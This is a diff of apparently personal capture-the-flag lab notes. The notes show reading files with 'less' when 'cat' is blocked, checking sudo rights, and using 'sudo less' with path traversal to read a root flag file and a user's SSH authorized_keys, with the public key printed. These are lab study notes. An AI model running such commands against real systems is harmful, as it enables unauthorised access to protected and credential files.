@@ -3,3 +3,23 @@ robots.txt: Wubbalubbadubdub
 
 
 portal.php found in extension scan
+
+"cat" command is not allowed but "less"
+
+
+less ../../../home/rick/second\ ingredients
+
+
+"sudo -l" : to see if we can run "sudo" 
+
+
+>> sudo less ../../../root/3rd.txt
+
+-- COMPLETED --
+
+Don't know what to really do with this but also found;
+
+>> sudo less ../../../home/ubuntu/.ssh/authorized_keys
+
+OUTPUT: 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCMLOT6NhiqH5Rp36qJt4jZwfvb/H/+YLRTrx5mS9dSyxumP8+chjxkSNOrdgNtZ6XoaDDDikslQvKMCqoJqHqp4jh9xTQTj29tagUaZmR0gUwatEJPG0SfqNvNExgsTtu2DW3SxCQYwrMtu9S4myr+4x+rwQ739SrPLMdBmughB13uC/3DCsE4aRvWL7p+McehGGkqvyAfhux/9SNgnIKayozWMPhADhpYlAomGnTtd8Cn+O1IlZmvqz5kJDYmnlKppKW2mgtAVeejNXGC7TQRkH6athI5Wzek9PXiFVu6IZsJePo+y8+n2zhOXM2mHx01QyvK2WZuQCvLpWKW92eF amiOpenVPN
